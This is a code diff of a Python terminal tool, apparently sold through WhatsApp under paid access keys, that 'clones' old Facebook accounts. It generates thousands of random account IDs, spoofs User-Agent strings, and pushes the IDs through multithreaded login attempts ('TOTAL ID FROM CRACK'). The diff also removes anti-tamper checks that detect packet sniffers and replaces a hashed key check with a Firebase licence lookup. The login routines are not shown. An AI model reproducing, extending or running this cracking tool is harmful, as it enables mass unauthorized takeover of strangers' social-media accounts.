@@ -1,654 +1,429 @@
 import os
-import re
-import time
-import uuid
-import hashlib
-import random
-import string
-import requests
 import sys
+import time
 import json
-import urllib
+import random
+import uuid
 import base64
-import subprocess
+import re
+import threading
+from datetime import datetime
 from bs4 import BeautifulSoup
 from random import randint as rr
 from concurrent.futures import ThreadPoolExecutor as tred
-from os import system
-from datetime import datetime
+import requests
 
-def clear_screen():
-    print("\033c", end="")
+# -------------------- Global Utility & Width --------------------
 
-def install_missing():
-    required = ['requests', 'chardet', 'urllib3', 'idna', 'certifi', 'httpx', 'bs4', 'mechanize', 'rich']
-    for module in required:
-        try:
-            mod = 'bs4' if module == 'bs4' else module
-            __import__(mod)
-        except ImportError:
-            print(f' \x1b[38;5;220m[*] Installing {module}...')
-            os.system(f'pip install {module} --quiet')
+def get_terminal_width():
+    try:
+        width = os.get_terminal_size().columns
+        return width if width > 20 else 80
+    except:
+        return 80
 
-install_missing()
-print('loading Modules ...\n')
-print("\033c", end="")
-import os, sys
+# -------------------- Internal UI Library (ANT Style) --------------------
 
-# WhatsApp number
-whatsapp_number = "923052962654"
-youtube_url = "https://www.youtube.com/@Update_29"
-whatsapp_url = "https://wa.me/923052962654?text=Salam+Bhai,+I+need+the+Access+Key"
-
-# 3-Level Encryption: Base64 -> MD5 -> SHA256
-def encrypt_key(key):
-    # Level 1: Base64
-    l1 = base64.b64encode(key.encode()).decode()
-    # Level 2: MD5
-    l2 = hashlib.md5(l1.encode()).hexdigest()
-    # Level 3: SHA256
-    l3 = hashlib.sha256(l2.encode()).hexdigest()
-    return l3
-
-# Pre-calculated 3-level hashes for keys:
-# ALI-12345 -> a688efe698e43127fe85f5c0c7777d45cbee8203ddfae0c598617c1a96ae46ef
-# GM-2025   -> 8052a8f347ef4ed171ed168fc611ed72dc195f600003f6790b0b037ea4d0e832
-# VIP-786   -> 1fbaddfd357c8fcf522c2012d294f04a826a109807d51c719681d5ec6f669eb3
-approved_hashes = [
-    "a688efe698e43127fe85f5c0c7777d45cbee8203ddfae0c598617c1a96ae46ef",
-    "8052a8f347ef4ed171ed168fc611ed72dc195f600003f6790b0b037ea4d0e832",
-    "1fbaddfd357c8fcf522c2012d294f04a826a109807d51c719681d5ec6f669eb3"
-]
-
-def safe_input(prompt_text):
-    """
-    Helper to handle input, checking for '/exit' to terminate the tool.
-    """
-    user_input = input(prompt_text)
-    if user_input.strip().lower() == '/exit':
-        print("\n[!] Exiting AHB...")
-        sys.exit(0)
-    return user_input
-
-# Store data file in the same directory as the script
-SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
-DATA_FILE = os.path.join(SCRIPT_DIR, ".ahb_data.json")
-
-def load_data():
-    if os.path.exists(DATA_FILE):
-        try:
-            with open(DATA_FILE, 'r') as f:
-                return json.load(f)
-        except:
-            return {"tasks": {"youtube": False, "whatsapp": False}, "key": None}
-    return {"tasks": {"youtube": False, "whatsapp": False}, "key": None}
-
-def save_data(data):
-    with open(DATA_FILE, 'w') as f:
-        json.dump(data, f)
-
-def task_menu():
-    data = load_data()
-    while True:
-        clear_screen()
-        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-        print("        🔒 Script Activation 🔒")
-        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
-        
-        yt_status = "✅" if data["tasks"]["youtube"] else "❌"
-        wa_status = "✅" if data["tasks"]["whatsapp"] else "❌"
-        
-        print(f" [1] Subscribe YouTube {yt_status}")
-        print(f" [2] Join WhatsApp Group {wa_status}")
-        print(f" [3] Mark All Tasks as Complete")
-        print(f" [4] Enter Approval Key")
-        print(f" [0] Exit\n")
-        
-        choice = safe_input(" [?] Choice: ")
-        
-        if choice == '1':
-            print(f"\n [!] Opening YouTube: {youtube_url}")
-            os.system(f"xdg-open {youtube_url}")
-            safe_input(" [!] Press Enter after subscribing...")
-            data["tasks"]["youtube"] = True
-            save_data(data)
-        elif choice == '2':
-            print(f"\n [!] Opening WhatsApp: {whatsapp_url}")
-            os.system(f"xdg-open {whatsapp_url}")
-            safe_input(" [!] Press Enter after joining...")
-            data["tasks"]["whatsapp"] = True
-            save_data(data)
-        elif choice == '3':
-            data["tasks"]["youtube"] = True
-            data["tasks"]["whatsapp"] = True
-            save_data(data)
-            print("\n [✓] Tasks marked as complete!")
-            time.sleep(1)
-        elif choice == '4':
-            if not (data["tasks"]["youtube"] and data["tasks"]["whatsapp"]):
-                print("\n [×] Pehle saare tasks complete karo!")
-                time.sleep(2)
-                continue
-            
-            user_key = safe_input("\n [?] Enter Key: ")
-            if encrypt_key(user_key) in approved_hashes:
-                print("\n [✓] Key Approved!")
-                data["key"] = user_key
-                save_data(data)
-                time.sleep(1)
-                return True
-            else:
-                print("\n [×] Invalid Key! Redirecting to support...")
-                os.system(f"xdg-open {whatsapp_url}")
-                time.sleep(2)
-        elif choice == '0':
-            sys.exit(0)
-
-def check_activation():
-    data = load_data()
-    # Check if tasks are complete
-    if not (data["tasks"]["youtube"] and data["tasks"]["whatsapp"]):
-        task_menu()
-    
-    # Always force key entry
-    clear_screen()
-    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print("        🔒 Access Required 🔒")
-    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
-    user_key = safe_input(" [?] Enter Approval Key: ")
-    if encrypt_key(user_key) in approved_hashes:
-        print("\n [✓] Key Approved!")
-        time.sleep(1)
-        return True
-    else:
-        print("\n [×] Invalid Key! Redirecting to support...")
-        os.system(f"xdg-open {whatsapp_url}")
-        time.sleep(2)
-        sys.exit(0)
-
-# Activation Check
-check_activation()
-
-# Tool ka main code yahan likh
-clear_screen()
-print(">>> Tool Successfully Unlocked <<<")
-
-
-
-
-# --- Anti-tampering and Security Checks ---
-# The script checks if the source code of the 'requests' library has been modified
-# or if packet sniffing tools are being used.
-try:
-    api_body = open(api.__file__, 'r').read()
-    models_body = open(models.__file__, 'r').read()
-    session_body = open(sessions.__file__, 'r').read()
-    word_list = ['print', 'lambda', 'zlib.decompress']
-    for word in word_list:
-        if word in api_body or word in models_body or word in session_body:
-            exit()
-except:
-    pass
-
-
-class sec:
-    """
-    A security class to detect debugging and packet sniffing tools.
-    """
+class Console:
     def __init__(self):
-        self.__module__ = __name__
-        self.__qualname__ = 'sec'
-        # Paths to check for modifications
-        paths = [
-            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
-            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
-            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
-        ]
-        for path in paths:
-            if 'print' in open(path, 'r').read():
-                self.fuck()
-        # Check for HTTPCanary (a packet sniffing app)
-        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
-            self.fuck()
-        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
-            self.fuck()
+        self.X = '\x1b[1;37m'
+        self.G = '\x1b[38;5;46m'
+        self.Y = '\x1b[38;5;220m'
+        self.CYAN = '\x1b[38;5;51m'
+        self.RED = '\x1b[38;5;196m'
+        self.BLUE = '\x1b[38;5;33m'
+        self.MAGENTA = '\x1b[38;5;201m'
+        self.RESET = '\x1b[0m'
+        self.BOLD = '\x1b[1m'
+        self.DIM = '\x1b[2m'
+        self.lock = threading.Lock()
 
-    def fuck(self):
-        """
-        Terminates the script if tampering is detected.
-        """
-        print(' \x1b[1;32m Congratulations ! ')
-        self.linex()
-        exit()
+    def _strip_tags(self, text):
+        return re.sub(r'\[.*?\]', '', text)
 
-    def linex(self):
-        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+    def _apply_tags(self, text):
+        text = text.replace("[bold green]", self.BOLD + self.G).replace("[/bold green]", self.RESET)
+        text = text.replace("[bold cyan]", self.BOLD + self.CYAN).replace("[/bold cyan]", self.RESET)
+        text = text.replace("[bold red]", self.BOLD + self.RED).replace("[/bold red]", self.RESET)
+        text = text.replace("[bold yellow]", self.BOLD + self.Y).replace("[/bold yellow]", self.RESET)
+        text = text.replace("[bold blue]", self.BOLD + self.BLUE).replace("[/bold blue]", self.RESET)
+        text = text.replace("[bold magenta]", self.BOLD + self.MAGENTA).replace("[/bold magenta]", self.RESET)
+        text = text.replace("[green]", self.G).replace("[/green]", self.RESET)
+        text = text.replace("[cyan]", self.CYAN).replace("[/cyan]", self.RESET)
+        text = text.replace("[red]", self.RED).replace("[/red]", self.RESET)
+        text = text.replace("[yellow]", self.Y).replace("[/yellow]", self.RESET)
+        text = text.replace("[blue]", self.BLUE).replace("[/blue]", self.RESET)
+        text = text.replace("[magenta]", self.MAGENTA).replace("[/magenta]", self.RESET)
+        text = text.replace("[dim]", self.DIM).replace("[/dim]", self.RESET)
+        text = text.replace("[bold]", self.BOLD).replace("[/bold]", self.RESET)
+        text = text.replace("[white]", self.X).replace("[/white]", self.RESET)
+        return text
 
+    def print(self, text, end="\n"):
+        print(self._apply_tags(text), end=end)
 
-# Global variables
+    def input(self, prompt):
+        return input(self._apply_tags(prompt))
+
+    def log(self, text):
+        with self.lock:
+            timestamp = datetime.now().strftime("%H:%M:%S")
+            sys.stdout.write("\r" + " " * get_terminal_width() + "\r")
+            print(f"{self.DIM}[{timestamp}]{self.RESET} {self._apply_tags(text)}{self.RESET}")
+
+    def status(self, message):
+        class StatusContext:
+            def __init__(self, console, msg):
+                self.console = console
+                self.msg = msg
+            def __enter__(self):
+                self.console.print(f" [bold cyan]●[/bold cyan] {self.msg}...", end="\r")
+                return self
+            def __exit__(self, exc_type, exc_val, exc_tb):
+                self.console.print(f" [bold green]✓[/bold green] {self.msg} [bold green]DONE![/bold green]    ")
+        return StatusContext(self, message)
+
+    def center_text(self, text, width):
+        clean = self._strip_tags(text)
+        padding = (width - len(clean)) // 2
+        if padding < 0: padding = 0
+        return " " * padding + text
+
+console = Console()
+
+def linex():
+    console.print(f"[dim]{'─' * get_terminal_width()}[/dim]")
+
+def show_panel(text, title=None, subtitle=None, footer=None, style="dim"):
+    width = get_terminal_width()
+    top = "╭"
+    if title: top += f"──┤ {title} ├"
+    if subtitle: top += f"─┤ {subtitle} ├"
+    remaining = width - len(console._strip_tags(top)) - 1
+    top += "─" * remaining + "╮"
+    console.print(f"[{style}]{top}[/{style}]")
+    for line in text.strip('\n').split('\n'):
+        if line.startswith("--- "):
+            section_title = line[4:].strip()
+            sec = f"├── {section_title} "
+            rem = width - len(console._strip_tags(sec)) - 1
+            sec += "─" * rem + "┤"
+            console.print(f"[{style}]{sec}[/{style}]")
+        else:
+            clean_line = console._strip_tags(line)
+            padding = width - len(clean_line) - 2
+            if padding < 0: padding = 0
+            console.print(f"[{style}]│[/{style}] {line}{' ' * padding} [{style}]│[/{style}]")
+    bottom = "╰"
+    if footer: bottom += f"──┤ {footer} ├"
+    remaining = width - len(console._strip_tags(bottom)) - 1
+    bottom += "─" * remaining + "╯"
+    console.print(f"[{style}]{bottom}[/{style}]")
+
+def show_success(msg):
+    console.print(f" [bold green]✓[/bold green] {msg}")
+
+def show_error(msg):
+    console.print(f" [bold red]×[/bold red] {msg}")
+
+def show_info(msg):
+    console.print(f" [bold cyan]◆[/bold cyan] {msg}")
+
+def show_warning(msg):
+    console.print(f" [bold yellow]![/bold yellow] {msg}")
+
+# -------------------- Global Variables --------------------
+
 method = []
 oks = []
 cps = []
 loop = 0
 user = []
 
-# Color codes for terminal output
-X = '\x1b[1;37m'
-rad = '\x1b[38;5;196m'
-G = '\x1b[38;5;46m'
-Y = '\x1b[38;5;220m'
-PP = '\x1b[38;5;203m'
-RR = '\x1b[38;5;196m'
-GS = '\x1b[38;5;40m'
-W = '\x1b[1;37m'
+# Legacy color codes (maintained for compatibility)
+X = '\x1b[1;37m'; rad = '\x1b[38;5;196m'; G = '\x1b[38;5;46m'; Y = '\x1b[38;5;220m'
+PP = '\x1b[38;5;203m'; RR = '\x1b[38;5;196m'; GS = '\x1b[38;5;40m'; W = '\x1b[1;37m'
+CYAN = '\x1b[38;5;51m'; RESET = '\x1b[0m'; BOLD = '\x1b[1m'; DIM = '\x1b[2m'
 
+DATA_FILE = ".ahh_data.json"
 
-def windows():
-    """
-    Generates a random Windows User-Agent string.
-    """
-    aV = str(random.choice(range(10, 20)))
-    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
-    bV = str(random.choice(range(1, 36)))
-    bx = str(random.choice(range(34, 38)))
-    bz = f'5{bx}.{bV}'
-    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
-    cV = str(random.choice(range(1, 36)))
-    cx = str(random.choice(range(34, 38)))
-    cz = f'5{cx}.{cV}'
-    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
-    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
-    return random.choice([A, B, C, D])
+# -------------------- Utility Functions --------------------
 
+def clear_screen():
+    os.system('clear' if os.name != 'nt' else 'cls')
+
+def safe_input(prompt: str) -> str:
+    val = console.input(prompt)
+    if val.strip().lower() == "/exit": sys.exit(0)
+    return val
+
+def load_data():
+    if os.path.exists(DATA_FILE):
+        try:
+            with open(DATA_FILE, "r") as f: return json.load(f)
+        except: pass
+    return {"tasks": {"youtube": False, "whatsapp": False}, "key": None}
+
+def save_data(data):
+    with open(DATA_FILE, "w") as f: json.dump(data, f)
+
+# -------------------- UI Components --------------------
+
+def header():
+    clear_screen()
+    width = get_terminal_width()
+    # Compact 3-line ASCII art (approx 30 chars wide)
+    art = [
+        "█ █ █ █▀▀ █▀▄   ▀█▀ █▀█ █▀█ █",
+        "█ █ █ █▀▀ █▀▄    █  █▄█ █▄█ █▄▄",
+        "▀▀▀▀▀ ▀▀▀ ▀▀     ▀  ▀▀▀ ▀▀▀ ▀▀▀"
+    ]
+    content = ""
+    for line in art: content += console.center_text(line, width-4) + "\n"
+    content += console.center_text("[bold cyan]WEB TOOL 👑[/bold cyan]", width-4) + "\n"
+    content += console.center_text("[dim]Professional Cloning Agent[/dim]", width-4) + "\n"
+    content += "--- session\n"
+    content += " ▎ [bold cyan]model[/bold cyan]    [white]Firebase DB[/white]  ·  [dim]online[/dim]\n"
+    content += " ▎ [bold cyan]mode[/bold cyan]     [white]Premium[/white]\n"
+    content += " ▎ [bold cyan]owner[/bold cyan]    [white]Ali Khan[/white]"
+    show_panel(content, title="WEB TOOL 👑", subtitle="v5.6.0", footer="cybervaultke · Ali Khan")
+
+def task_menu():
+    data = load_data()
+    while True:
+        header()
+        console.print("\n [bold yellow]ACTIVATION TASKS[/bold yellow]")
+        linex()
+        yt_status = "[bold green]DONE[/bold green]" if data["tasks"]["youtube"] else "[bold red]PENDING[/bold red]"
+        wa_status = "[bold green]DONE[/bold green]" if data["tasks"]["whatsapp"] else "[bold red]PENDING[/bold red]"
+        console.print(f" ◆ [bold yellow]01[/bold yellow]  Subscribe YouTube     {yt_status:>20}")
+        console.print(f" ◆ [bold yellow]02[/bold yellow]  Join WhatsApp Group   {wa_status:>20}")
+        console.print(f" ◆ [bold yellow]03[/bold yellow]  Mark All Complete     {'[dim]SKIP[/dim]':>20}")
+        console.print("\n [bold cyan]ACCESS[/bold cyan]")
+        linex()
+        console.print(f" ◆ [bold yellow]04[/bold yellow]  Enter Access Key      {'[bold cyan]LOGIN[/bold cyan]':>20}")
+        console.print(f" ◆ [bold yellow]00[/bold yellow]  Exit Tool             {'[bold red]EXIT[/bold red]':>20}")
+        linex()
+        choice = safe_input("\n [?] Selection: ")
+        if choice == '1':
+            show_info("Opening YouTube: https://www.youtube.com/@cybervaultke")
+            safe_input(" Press Enter after subscribing...")
+            data["tasks"]["youtube"] = True; save_data(data)
+        elif choice == '2':
+            show_info("Opening WhatsApp: https://wa.me/923052962654")
+            safe_input(" Press Enter after joining...")
+            data["tasks"]["whatsapp"] = True; save_data(data)
+        elif choice == '3':
+            data["tasks"]["youtube"] = True; data["tasks"]["whatsapp"] = True
+            save_data(data); show_success("All tasks marked as complete!"); time.sleep(1)
+        elif choice == '4':
+            if not (data["tasks"]["youtube"] and data["tasks"]["whatsapp"]):
+                show_error("Please complete the required tasks first!"); time.sleep(2); continue
+            return True
+        elif choice == '0': sys.exit(0)
+
+def check_activation():
+    data = load_data()
+    if not (data["tasks"]["youtube"] and data["tasks"]["whatsapp"]):
+        if not task_menu(): return False
+    header()
+    console.print("\n [bold yellow]SECURITY CHECK[/bold yellow]")
+    linex()
+    console.print(" ▎ [bold yellow]Registered Name[/bold yellow] : [dim](required)[/dim]")
+    console.print(" ▎ [bold yellow]Approval Key[/bold yellow]    : [dim](required)[/dim]")
+    linex()
+    user_name = safe_input(" [?] Enter Name : ")
+    user_key = safe_input(" [?] Enter Key  : ")
+    with console.status("Verifying credentials"):
+        try:
+            from firebase_client import FirebaseClient
+            fb = FirebaseClient()
+            key_data = fb.get_data(f'keys/{user_key}')
+            time.sleep(1)
+        except Exception as e:
+            show_error(f"Firebase connection error: {e}"); time.sleep(2); return task_menu()
+    if key_data and key_data.get('name') == user_name:
+        data["key"] = user_key; save_data(data)
+        header()
+        console.print("\n [bold green]WEBT 👑 SESSION AUTHORIZED[/bold green]")
+        linex()
+        console.print(f" ▎ [bold cyan]status[/bold cyan]    [bold green]AUTHORIZED[/bold green]")
+        console.print(f" ▎ [bold cyan]expiry[/bold cyan]    [bold yellow]{key_data.get('expiry', 'N/A')}[/bold yellow]")
+        console.print("\n [bold yellow]SUBSCRIPTION DETAILS[/bold yellow]")
+        linex()
+        console.print(" ▎ 7 Days  = 300 PKR  ·  15 Days = 600 PKR")
+        console.print(" ▎ 30 Days = 900 PKR  ·  Lifetime = 2500 PKR")
+        console.print("\n [bold cyan]PAYMENT & SUPPORT[/bold cyan]")
+        linex()
+        console.print(" ▎ WhatsApp: [bold green]https://wa.me/923052962654[/bold green]")
+        console.print(f" ▎ Your Key : [bold yellow]{user_key}[/bold yellow]")
+        linex()
+        safe_input(" Press Enter to continue to Main Menu...")
+        return True
+    else:
+        show_error("Invalid credentials or key expired!"); time.sleep(2); return task_menu()
+
+# -------------------- Cloning Logic --------------------
 
 def window1():
-    """
-    Generates another variant of a random Windows User-Agent string.
-    """
     aV = str(random.choice(range(10, 20)))
     A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
-    bV = str(random.choice(range(1, 36)))
-    bx = str(random.choice(range(34, 38)))
-    bz = f'5{bx}.{bV}'
-    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
-    cV = str(random.choice(range(1, 36)))
-    cx = str(random.choice(range(34, 38)))
-    cz = f'5{cx}.{cV}'
-    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
-    latest_build = rr(6000, 9000)
-    latest_patch = rr(100, 200)
-    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
-    return random.choice([A, B, C, D])
-
-
-# Set window title
-sys.stdout.write('\x1b]2;𓆩【A H B 👑 】𓆪 \x07')
-
-
-    # AHB Clover Logo - Green - Version 2.5
-def ____banner____():
-    if 'win' in sys.platform:
-        os.system('cls')
-    else:
-        os.system('clear')
-    
-    print("""\033[1;32m
-        
-               ░█████╗░  ██╗░░██╗  ██████╗░
-               ██╔══██╗  ██║░░██║  ██╔══██╗
-               ███████║  ███████║  ██████╦╝
-               ██╔══██║  ██╔══██║  ██╔══██╗
-               ██║░░██║  ██║░░██║  ██████╦╝
-               ╚═╝░░╚═╝  ╚═╝░░╚═╝  ╚═════╝░
-\033[0m""")
-
+    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{rr(6000, 9000)}.{rr(100, 200)} Safari/537.36"
+    return random.choice([A, D])
 
 def creationyear(uid):
-    """
-    Estimates the Facebook account creation year based on the UID.
-    """
     if len(uid) == 15:
-        if uid.startswith('1000000000'):
-            return '2009'
-        if uid.startswith('100000000'):
-            return '2009'
-        if uid.startswith('10000000'):
-            return '2009'
-        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
-            return '2009'
-        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
-            return '2010'
-        if uid.startswith('100001'):
-            return '2010'
-        if uid.startswith(('100002', '100003')):
-            return '2011'
-        if uid.startswith('100004'):
-            return '2012'
-        if uid.startswith(('100005', '100006')):
-            return '2013'
-        if uid.startswith(('100007', '100008')):
-            return '2014'
-        if uid.startswith('100009'):
-            return '2015'
-        if uid.startswith('10001'):
-            return '2016'
-        if uid.startswith('10002'):
-            return '2017'
-        if uid.startswith('10003'):
-            return '2018'
-        if uid.startswith('10004'):
-            return '2019'
-        if uid.startswith('10005'):
-            return '2020'
-        if uid.startswith('10006'):
-            return '2021'
-        if uid.startswith('10009'):
-            return '2023'
-        if uid.startswith(('10007', '10008')):
-            return '2022'
-        return ''
-    elif len(uid) in (9, 10):
-        return '2008'
-    elif len(uid) == 8:
-        return '2007'
-    elif len(uid) == 7:
-        return '2006'
-    elif len(uid) == 14 and uid.startswith('61'):
-        return '2024'
-    else:
-        return ''
-
-
-def clear():
-    os.system('clear')
-
-
-def linex():
-    print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-
-
-def BNG_71_():
-    """
-    Main menu function.
-    """
-    while True:
-        try:
-            ____banner____()
-            print('       \x1b[38;5;196m(\x1b[1;37m1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CLONE')
-            linex()
-            __Jihad__ = safe_input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mCHOICE  {W}: {Y}")
-            if __Jihad__ in ('1', '01'):
-                old_clone()
-            else:
-                print(f"\n    {rad}Invalid option, redirecting to support... ")
-                time.sleep(1)
-                os.system(f"xdg-open {whatsapp_url}")
-                time.sleep(2)
-        except KeyboardInterrupt:
-            print("\n\n[!] Returning to main menu...")
-            continue
-
-
-def old_clone():
-    """
-    Menu for selecting old account cloning type.
-    """
-    ____banner____()
-    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49mALL SERIES')
-    linex()
-    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49m100003/4 SERIES')
-    linex()
-    print('       \x1b[38;5;196m(\x1b[1;37mC\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49m2009 series')
-    linex()
-    _input = safe_input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mCHOICE  {W}: {Y}")
-    if _input in ('A', 'a', '01', '1'):
-        old_One()
-    elif _input in ('B', 'b', '02', '2'):
-        old_Tow()
-    elif _input in ('C', 'c', '03', '3'):
-        old_Tree()
-    else:
-        print(f"\n[×]{rad} Choose Value Option... ")
-        BNG_71_()
-
-
-def old_One():
-    """
-    Cloning method for accounts from 2010-2014.
-    """
-    user = []
-    ____banner____()
-    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49mOld Code {Y}:{G} 2010-2014")
-    ask = safe_input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mSELECT {Y}:{G} ")
-    linex()
-    ____banner____()
-    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
-    limit = safe_input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
-    linex()
-    star = '10000'
-    for _ in range(int(limit)):
-        data = str(random.randint(1000000000, 1999999998 if ask == '1' else 4999999998))
-        user.append(data)
-    print('        \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 1')
-    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 2')
-    linex()
-    meth = safe_input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
-    with tred(max_workers=30) as pool:
-        ____banner____()
-        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
-        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
-        linex()
-        for mal in user:
-            uid = star + mal
-            if meth == 'A':
-                pool.submit(login_1, uid)
-            elif meth == 'B':
-                pool.submit(login_2, uid)
-            else:
-                print(f"    {rad}[!] INVALID METHOD SELECTED")
-                break
-
-
-def old_Tow():
-    """
-    Cloning method for accounts with specific prefixes.
-    """
-    user = []
-    ____banner____()
-    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2010-2014")
-    ask = safe_input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
-    linex()
-    ____banner____()
-    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
-    limit = safe_input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
-    linex()
-    prefixes = ['100003', '100004']
-    for _ in range(int(limit)):
-        prefix = random.choice(prefixes)
-        suffix = ''.join(random.choices('0123456789', k=9))
-        uid = prefix + suffix
-        user.append(uid)
-    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
-    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD B')
-    linex()
-    meth = safe_input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
-    with tred(max_workers=30) as pool:
-        ____banner____()
-        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
-        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
-        linex()
-        for uid in user:
-            if meth == 'A':
-                pool.submit(login_1, uid)
-            elif meth == 'B':
-                pool.submit(login_2, uid)
-            else:
-                print(f"    {rad}[!] INVALID METHOD SELECTED")
-                break
-
-
-def old_Tree():
-    """
-    Cloning method for accounts from 2009-2010.
-    """
-    user = []
-    ____banner____()
